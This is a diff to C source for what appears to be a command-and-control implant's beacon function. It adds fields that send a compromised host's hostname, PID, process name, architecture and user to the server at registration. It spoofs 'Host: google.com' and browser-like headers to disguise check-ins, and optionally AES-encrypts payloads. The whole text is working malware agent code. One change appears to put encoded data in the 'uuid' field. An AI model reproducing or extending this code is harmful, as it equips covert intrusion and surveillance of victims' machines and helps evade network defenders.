@@ -3,9 +3,10 @@
 #include <string.h>
 #include "functions/connection/connection.h"
 #include "functions/connection/structs.h"
-#include "cjson/cJSON.h"
+#include "cJSON.h"
 #include "functions/base64/base64.h"
 #include "functions/aes/aes.h"
+#define ARCH "x64"
 
 /*
 Explaining mbedTLS integration:
@@ -16,9 +17,8 @@ Within the connection() function, you are configuring mbedTLS to use these funct
 form of sockets. So, mbedtls_ssl_write/read is sending your encrypted HTTPS request to the two functions which will then be used to send/recv data.
 
 Within the overall program there is some overhead with performing multiple SSL connections becasue the current workflow is this:
-    1. main() while loop -> connection() initialize rings -> connect to https stream -> send_get() uses rings
-    2. send2serv() -> connection() initialize rings -> connect to https stream -> send2serv() uses rings.
-    3. Clean up rings and connection
+    1. main() while loop -> send2serv() -> connection() initialize rings -> connect to https stream -> send2serv() uses the rings.
+    2. Clean up rings and connection
 So basically we're initializing rings every X amount of seconds. Twice if output is sent. Same goes for connecting to the https stream.
 */
 
@@ -41,10 +41,12 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
     connection(req);
     char *json_string = NULL;
     size_t body_len = 0;
+    char request_buffer[2048];
+    int header_len = 0;
 
     if (strcmp(profile->method, "POST") == 0) {
         cJSON *json = cJSON_CreateObject();
-        if (profile->reg == (int *)0) {
+        if (profile->reg == 0) {
             cJSON_AddStringToObject(json, "uuid", profile->uuid);
             if (profile->aes == 0) {
                 char *encoded_data = base64_encode(buf, len);
@@ -53,12 +55,30 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
                 char *encoded_data = aes_encrypt(buf, len, profile);
                 cJSON_AddStringToObject(json, "data", encoded_data);
             }
-        } else if (profile->reg == (int *)1) {
+        } else if (profile->reg == 1) {
             // Add extra data for registration
-            cJSON_AddStringToObject(json, "uuid", profile->uuid);
             char *encoded_data = base64_encode(buf, len);
+            char *encoded_agent = base64_encode((const unsigned char *)profile->agent, strlen(profile->agent));
+            char *encoded_hostname = base64_encode((const unsigned char *)profile->hostname, strlen(profile->hostname));
+            char *encoded_pid = base64_encode((const unsigned char *)profile->pid, profile->pid_len);
+            char *encoded_process = base64_encode((const unsigned char *)profile->process, strlen(profile->process));
+            char *encoded_arch = base64_encode((const unsigned char *)ARCH, strlen(ARCH));
+
+            cJSON_AddStringToObject(json, "uuid", encoded_data);
             cJSON_AddStringToObject(json, "data", encoded_data);
             cJSON_AddStringToObject(json, "user", profile->user);
+            cJSON_AddStringToObject(json, "profile", encoded_agent);
+            cJSON_AddStringToObject(json, "hostname", encoded_hostname);
+            cJSON_AddStringToObject(json, "process", encoded_process);
+            cJSON_AddStringToObject(json, "arch", encoded_arch);
+            cJSON_AddStringToObject(json, "pid", encoded_pid);
+
+            free(encoded_data);
+            free(encoded_agent);
+            free(encoded_hostname);
+            free(encoded_pid);
+            free(encoded_process);
+            free(encoded_arch);
         }
 
         json_string = cJSON_PrintUnformatted(json); // Serialize the JSON data into a string
@@ -69,10 +89,6 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
         cJSON_Delete(json);
         body_len = strlen(json_string);
 
-    }
-    char request_buffer[2048];
-    int header_len = 0;
-    if (strcmp(profile->method, "POST") == 0) {
         header_len = snprintf(request_buffer, sizeof(request_buffer),
                            "POST %s HTTP/1.1\r\n"
                            "Host: google.com\r\n"
@@ -87,15 +103,14 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
                            "Sec-Fetch-Mode: navigate\r\n"
                            "Sec-Fetch-User: ?1\r\n"
                            "Sec-Fetch-Dest: document\r\n"
-                           "Sec-Purpose: %s\r\n"
+                           "Sec-Purpose: prefetch\r\n"
                            "Accept-Encoding: gzip, deflate, br\r\n"
-                           "X-Forwarded-Host: %s\r\n"
                            "Priority: u=0, i\r\n"
                            "Connection: close\r\n\r\n",
-                          profile->path, body_len, profile->agent, profile->hostname);
+                          profile->path, body_len);
     } else {
         header_len = snprintf(request_buffer, sizeof(request_buffer),
-                           "GET %s?uuid=%s HTTP/1.1\r\n"
+                           "GET %s?id=%s HTTP/1.1\r\n"
                            "Host: google.com\r\n"
                            "Accept-Language: en-US,en;q=0.\r\n"
                            "Upgrade-Insecure-Requests: 1\r\n"
@@ -106,12 +121,11 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
                            "Sec-Fetch-Mode: navigate\r\n"
                            "Sec-Fetch-User: ?1\r\n"
                            "Sec-Fetch-Dest: document\r\n"
-                           "Sec-Purpose: %s\r\n"
+                           "Sec-Purpose: prefetch\r\n"
                            "Accept-Encoding: gzip, deflate, br\r\n"
-                           "X-Forwarded-Host: %s\r\n"
                            "Priority: u=0, i\r\n"
                            "Connection: close\r\n\r\n",
-                           profile->path, profile->uuid, profile->agent, profile->hostname);
+                           profile->path, profile->uuid);
     }
     
     size_t total_len = header_len + body_len;
@@ -125,6 +139,7 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
     fflush(stdout);
     size_t sent = 0;
     int ret = 0;
+    // Send the request to the server over SSL
     while (sent < total_len) {
         ret = mbedtls_ssl_write(&req->ssl, full_req + sent, total_len - sent);
         if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
@@ -140,6 +155,7 @@ char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t l
     free(full_req);
     free(json_string);
 
+    // Get the response from the server
     ret = 0;
     size_t total_read = 0;
     memset(req->buffer, 0, BUFFER_SIZE);
